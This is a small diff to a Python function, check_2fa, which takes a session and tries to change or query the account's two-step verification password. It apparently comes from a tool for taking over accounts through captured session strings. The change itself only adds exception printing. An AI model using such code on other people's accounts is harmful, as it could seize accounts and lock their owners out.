@@ -291,7 +291,8 @@ async def check_2fa(session):
             try:
                 await steve.edit_2fa("TonyStank")
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
-            except:
+            except Exception as e:
+                print(e)
                 i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                         
             await steve.disconnect() 
@@ -307,7 +308,8 @@ async def check_2fa(session):
                 try:
                     await stark.password("TonyStark")
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ"
-                except:
+                except Exception as e:
+                    print(e)
                     i += "ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ"
                          
     except Exception as idk:
